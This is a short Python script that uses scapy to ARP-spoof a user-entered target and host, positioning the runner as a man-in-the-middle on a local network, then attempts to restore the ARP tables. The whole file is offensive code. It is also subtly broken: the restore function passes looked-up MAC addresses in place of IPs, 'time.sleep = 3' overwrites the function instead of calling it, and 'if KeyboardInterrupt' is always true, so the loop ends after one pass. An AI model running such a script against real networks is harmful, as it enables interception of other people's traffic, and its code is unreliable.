from scapy.all import send, ARP, Ether, srp
import time

def get_mac(ip):
    request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    request_broadcast = broadcast / request
    online = srp(request_broadcast, timeout=3, verbose=False)[0]
    return online[0][1].hwsrc

def restore_adress(destination, source):
    destination = get_mac(destination)
    source = get_mac(source)
    restoring_packet = ARP(op=2, pdst=destination, hwdst=destination, psrc=source, hwsrc=source)
    send (restoring_packet, verbose=False)
    time.sleep = 3
    
def arp_spoofing(spoof, target):
    mac = get_mac(target)
    spoofing_packet = ARP(op=2, pdst=target, hwdst=mac, psrc=spoof)
    send (spoofing_packet, verbose=False)
    time.sleep(3)
    
target_ip = input("Target IP: ")
host_ip = input("Host IP: ")

while True:
    arp_spoofing(host_ip, target_ip)
    arp_spoofing(target_ip, host_ip)
    if KeyboardInterrupt:
        restore_adress(target_ip, host_ip)
        restore_adress(host_ip, target_ip)
        print("Attack has been stopped")
        break
